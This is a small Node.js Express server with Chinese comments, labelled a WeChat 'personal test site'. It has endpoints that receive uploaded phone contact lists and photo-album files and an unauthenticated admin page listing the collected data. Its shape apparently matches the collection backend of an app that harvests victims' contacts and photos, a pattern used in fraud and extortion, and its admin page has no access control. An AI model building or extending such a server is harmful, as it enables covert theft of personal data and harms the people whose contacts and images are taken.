const express = require('express')
const cors = require('cors')
const multer = require('multer')
const fs = require('fs')
const app = express()
const port = process.env.PORT || 3000

app.use(cors())
app.use(express.json())
// 绑定前端文件夹 page
app.use(express.static('page'))

// 关键修复：访问根目录时，直接返回你的前端文件
app.get('/', (req, res) => {
    res.sendFile('indexs.html', { root: './page' })
})

const upload = multer({dest:'fileData/'})
if(!fs.existsSync('fileData')) fs.mkdirSync('fileData')

// 载入基础设置接口
app.get('/api/baseLoad',(req,res)=>{
    res.json({
        title:"微信自用测试站点",
        state:"基础配置载入成功",
        tip:"仅个人测试使用"
    })
})

// 接收通讯录
app.post('/api/saveTel',upload.single('telFile'),(req,res)=>{
    res.json({code:200,msg:"通讯录数据已接收"})
})

// 接收相册
app.post('/api/saveImg',upload.single('imgFile'),(req,res)=>{
    res.json({code:200,msg:"相册数据已接收"})
})

// 后台查看
app.get('/api/adminData',(req,res)=>{
    let list = fs.existsSync('fileData') ? fs.readdirSync('fileData') : []
    let html = `<h2>后台数据中心</h2><p>共${list.length}条数据</p><ul>`
    list.forEach(v=>html+=`<li>${v}</li>`)
    html += `</ul>`
    res.send(html)
})

app.listen(port,()=>{
    console.log('服务正常运行')
})